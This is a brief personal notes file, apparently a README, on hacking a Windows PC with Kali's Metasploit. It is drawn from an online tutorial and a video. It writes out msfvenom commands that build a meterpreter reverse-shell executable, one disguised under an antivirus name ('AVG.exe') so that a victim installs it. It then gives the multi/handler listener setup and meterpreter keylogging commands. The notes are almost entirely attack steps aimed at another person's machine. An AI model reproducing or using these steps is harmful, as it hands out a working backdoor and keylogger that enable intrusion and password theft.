# Requires kali built in metasploit framework

##https://www.instructables.com/Hack-Windows-PC-Using-Kali-Linux/

This seems like interesting project to do.
Simple enough to do it

First create a payload that allows us to get into windows. (The user has to install this file)
  > msfvenom -p windows/meterpreter/reverse_tcp - platform windows-a x86 -f exe -o /root/Desktop/back.exe

Not sure if it works but youtuber used this as back door
- https://www.youtube.com/watch?v=NswVmCacnfs
  > msfvenom -p windows/meterpreter/reverse_tcp LHOST=(your_IP) LPORT=4444 -f exe > /root/Desktop/AVG.exe

Then start metasploit framework console
  > msfconsole

He mentioned there are many different exploitation method (Will have to research on this)
In this project he used multi handler
  > use exploit/multi/handler

Specify payload
  > set payload windows/meterpreter/reverse_tcp

Provide current IP to allow communication between the two
  > set LHOST {IP}

get the other machine to install and type
  > exploit

allows keylogging
  > keyscan_start
  > keyscan_stop
  > keyscan_dump
